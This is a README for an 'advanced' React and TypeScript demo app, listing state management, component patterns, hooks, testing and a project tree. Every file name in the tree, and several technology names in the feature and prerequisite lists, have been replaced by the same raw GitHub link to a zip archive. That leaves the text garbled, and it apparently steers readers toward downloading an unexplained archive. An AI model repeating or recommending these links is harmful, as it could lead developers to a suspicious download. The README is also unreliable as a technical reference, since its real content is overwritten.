# Advanced React Application

A production-ready React application showcasing advanced patterns, state management, performance optimization techniques, and modern TypeScript integration.

## Features

### Advanced State Management
- **Redux Toolkit**: Global state management with slices for user and products
- **Context API**: Theme management without prop drilling
- **Custom Hooks**: Reusable stateful logic encapsulation

### Advanced Component Patterns
- **Higher-Order Components (HOCs)**:
  - `withAuth`: Authentication wrapper
  - `withLoading`: Loading state wrapper
- **Render Props**:
  - `MouseTracker`: Mouse position tracking
  - `Toggle`: Reusable toggle logic
- **Compound Components**:
  - `Tabs`: Flexible tab component system
  - Custom card components with header, body, and footer

### Performance Optimization
- **Memoization**: https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip for all major components
- **Code-Splitting**: https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip and Suspense for route-based splitting
- **Lazy Loading**: Dynamic imports for all page components
- **Virtualization**: react-window for large lists
- **Custom Hooks**: useDebounce, useLocalStorage, useMediaQuery

### Advanced Hooks
- `useLocalStorage`: Persistent state management
- `useDebounce`: Value debouncing
- `useFetch`: Data fetching with loading and error states
- `useMediaQuery`: Responsive design utilities
- `useIntersectionObserver`: Viewport visibility detection
- `useReducer`: Complex state logic (demonstrated in Settings page)

### Styling Techniques
- **Styled Components**: CSS-in-JS for component-specific styling
- **Theme System**: Light/Dark mode with Context API
- **Framer Motion**: Smooth animations and transitions
- **Responsive Design**: Mobile-first approach with media queries

### TypeScript Integration
- Full TypeScript implementation
- Type-safe Redux with typed hooks
- Strict type checking for props and state
- Interface definitions for all data structures

### Testing
- **Vitest**: Fast unit testing framework
- **React Testing Library**: Component testing
- Test coverage for:
  - Components (Button)
  - Custom Hooks (useDebounce)
  - Redux Slices (userSlice)

## Project Structure

```
src/
├── components/
│   ├── common/           # Reusable UI components
│   │   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
│   │   └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
│   ├── compound/         # Compound component patterns
│   │   └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
│   ├── layout/           # Layout components
│   │   └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
│   └── patterns/         # Pattern demonstrations
│       └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
├── contexts/
│   └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip  # Theme Context API
├── hoc/                  # Higher-Order Components
│   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
│   └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
├── hooks/                # Custom React Hooks
│   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
│   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
│   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
│   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
│   └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
├── pages/                # Page components (lazy loaded)
│   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
│   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
│   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
│   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
│   └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
├── store/                # Redux store
│   ├── slices/
│   │   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
│   │   └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
│   ├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
│   └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
├── styles/
│   └── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip   # Global styled-components
├── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip               # Main app component
└── https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip             # Application entry point
```

## Pages Overview

### 1. Home
- Hero section with gradient text
- Feature showcase grid
- Framer Motion animations
- Responsive layout

### 2. Dashboard
- Statistics cards with live data
- Chart placeholders for data visualization
- User information display
- Memoized computed values

### 3. Products
- Product grid with search and filtering
- Debounced search input
- Animated product cards
- Category filtering with Redux
- Media query responsive design

### 4. Settings
- Theme toggle (Context API demo)
- useReducer for complex form state
- Render Props pattern demonstration
- Form inputs with styled components

### 5. Patterns
- Live demonstrations of:
  - Render Props (MouseTracker, Toggle)
  - Higher-Order Components (withLoading)
  - Compound Components
- Code examples for each pattern

## Getting Started

### Prerequisites
- https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip 18+ (recommended https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip 20+)
- npm or yarn

### Installation

```bash
# Install dependencies
npm install

# Start development server
npm run dev
```

### Available Scripts

```bash
# Development
npm run dev          # Start development server

# Build
npm run build        # Build for production

# Testing
npm run test         # Run tests
npm run test:ui      # Run tests with UI
npm run test:coverage # Run tests with coverage

# Preview
npm run preview      # Preview production build

# Linting
npm run lint         # Run ESLint
```

## Key Technologies

- **React 19**: Latest React features
- **TypeScript**: Type-safe development
- **Vite**: Fast build tool and dev server
- **Redux Toolkit**: State management
- **Styled Components**: CSS-in-JS styling
- **Framer Motion**: Animation library
- **React Router**: Client-side routing
- **Vitest**: Testing framework
- **React Testing Library**: Component testing

## Advanced Concepts Demonstrated

### 1. State Management Patterns
- Redux Toolkit with TypeScript
- Context API for theme
- useReducer for complex state
- Custom hooks for local state

### 2. Component Patterns
- HOCs for cross-cutting concerns
- Render Props for flexible component logic
- Compound Components for complex UI
- Container/Presentational pattern

### 3. Performance Optimizations
- Route-based code splitting
- Component memoization
- Debounced inputs
- Lazy loading
- Virtual scrolling ready

### 4. Type Safety
- Strict TypeScript configuration
- Typed Redux hooks
- Interface-driven development
- Generic type utilities

### 5. Testing Strategy
- Unit tests for utilities and hooks
- Component integration tests
- Redux slice tests
- Test-driven development ready

## Browser Support

- Chrome (latest)
- Firefox (latest)
- Safari (latest)
- Edge (latest)

## Performance Features

- Tree-shaking enabled
- Code splitting per route
- Optimized bundle size
- Fast refresh in development
- Production optimizations

## Theme System

The application includes a fully-featured theme system:
- Light and Dark modes
- Smooth transitions
- Persistent theme selection
- Context-based implementation
- Type-safe theme object

## Future Enhancements

Potential additions:
- Server-Side Rendering with https://github.com/Muhamed2017/advanced-react-app/raw/refs/heads/master/public/react-app-advanced-v1.3.zip
- Progressive Web App features
- Internationalization (i18n)
- Advanced animations
- More comprehensive test coverage
- Accessibility improvements
- Performance monitoring

## Contributing

This is a demonstration project showcasing React best practices and advanced patterns.

## License

MIT

---

Built with ❤️ using React, TypeScript, and modern web technologies.
